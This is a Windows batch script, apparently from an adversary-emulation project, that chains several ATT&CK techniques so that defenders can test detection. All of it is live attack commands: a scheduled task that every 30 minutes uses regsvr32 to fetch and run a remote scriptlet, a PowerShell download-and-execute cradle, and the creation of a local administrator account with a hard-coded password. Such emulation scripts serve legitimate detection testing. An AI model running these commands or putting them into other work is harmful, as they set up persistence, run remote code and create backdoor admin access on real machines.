:: Chain Reaction 01
::
:: NOTE it is a BAD idea to execute scripts from a repo that you do not control.
:: NOTE We recommend executing from a server that you control.
:: NOTE Thank You :)
:: This particular Chain Reaction focuses on generating event noise.

:: Tactics: Persistence, Defense Evasion
:: Scheduled Task https://attack.mitre.org/wiki/Technique/T1053
:: RegSvr32 https://attack.mitre.org/wiki/Technique/T1117
:: This particular technique will reach out to the github repository (network) and spawn calc (process) every 30 minutes.

SCHTASKS /Create /SC MINUTE /TN "Atomic Testing" /TR "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll" /mo 30

:: Tactic: Discovery
:: Execution: https://attack.mitre.org/wiki/Technique/T1086
:: Have PowerShell download the Discovery.bat, output to a local file (for review later)

powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat')" > output.txt

:: Tactic: Credential Access
:: Technique: Create Account https://attack.mitre.org/wiki/Technique/T1136
:: Add a user, then add to group

Net user /add Trevor SmshBgr123

:: Add user to group

net localgroup administrators Trevor /add

ECHO Well that was fun!

pause
